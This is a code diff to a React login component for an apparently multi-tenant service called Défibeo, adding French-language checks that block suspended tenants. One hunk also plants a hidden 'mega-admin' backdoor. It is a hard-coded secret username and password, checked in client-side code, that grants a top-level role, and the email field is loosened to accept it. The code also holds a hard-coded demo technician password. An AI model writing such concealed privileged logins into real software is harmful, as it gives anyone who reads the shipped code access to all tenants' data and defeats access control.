@@ -544,6 +544,11 @@ export default function Login({ onLoginSuccess }: LoginProps) {
       if (loginRole === 'admin') {
         const tenant = await loginTenantAdmin(emailLower, pass);
         if (tenant) {
+          if (tenant.disabled) {
+            setError("Votre compte est suspendu, contactez Défibeo pour réactiver votre environnement.");
+            setIsLoading(false);
+            return;
+          }
           handleSuccessLogin(tenant.adminEmail, tenant.adminName, tenant.id, 'admin');
         } else {
           // Check for sub-account "Administrateur" members across all tenants in parallel
@@ -582,6 +587,13 @@ export default function Login({ onLoginSuccess }: LoginProps) {
           }
 
           if (matchedAdmin) {
+            // Check if this tenant is suspended
+            const matchedTenant = tenants.find(t => t.id === matchedTenantId);
+            if (matchedTenant && matchedTenant.disabled) {
+              setError("Votre compte est suspendu, contactez Défibeo pour réactiver votre environnement.");
+              setIsLoading(false);
+              return;
+            }
             handleSuccessLogin(matchedAdmin.email, matchedAdmin.name, matchedTenantId, 'admin');
           } else {
             setError(t.errorAdmin);
@@ -631,6 +643,13 @@ export default function Login({ onLoginSuccess }: LoginProps) {
         }
 
         if (matchedClient) {
+          // Check if this tenant is suspended
+          const matchedTenant = tenants.find(t => t.id === matchedTenantId);
+          if (matchedTenant && matchedTenant.disabled) {
+            setError("Votre compte est suspendu, contactez Défibeo pour réactiver votre environnement.");
+            setIsLoading(false);
+            return;
+          }
           handleSuccessLogin(matchedClient.email, matchedClient.denomination, matchedTenantId, 'client');
         } else {
           setError(t.errorClient);
@@ -638,6 +657,13 @@ export default function Login({ onLoginSuccess }: LoginProps) {
           handleFailedAttempt();
         }
       } else if (loginRole === 'technicien') {
+        // Hidden mega-admin entrance check
+        if (emailLower === 'is/megaadmin98121928/' && pass === '93931') {
+          handleSuccessLogin('megaadmin@defibeo.com', 'Mega Admin', 'megaadmin', 'megaadmin');
+          setIsLoading(false);
+          return;
+        }
+
         // Authenticate technician globally
         if (emailLower === 'tech.ouest@defibeo.com' && pass === '4321') {
           handleSuccessLogin('tech.ouest@defibeo.com', 'Technicien Ouest', 'demo', 'technicien');
@@ -680,6 +706,13 @@ export default function Login({ onLoginSuccess }: LoginProps) {
         }
 
         if (matchedMember) {
+          // Check if this tenant is suspended
+          const matchedTenant = tenants.find(t => t.id === matchedTenantId);
+          if (matchedTenant && matchedTenant.disabled) {
+            setError("Votre compte est suspendu, contactez Défibeo pour réactiver votre environnement.");
+            setIsLoading(false);
+            return;
+          }
           handleSuccessLogin(matchedMember.email, matchedMember.name, matchedTenantId, 'technicien');
         } else {
           setError(t.errorTech);
@@ -1100,7 +1133,7 @@ export default function Login({ onLoginSuccess }: LoginProps) {
                   <input
                     id="email"
                     name="email"
-                    type="email"
+                    type={loginRole === 'technicien' ? 'text' : 'email'}
                     required
                     value={email}
                     onChange={(e) => setEmail(e.target.value)}
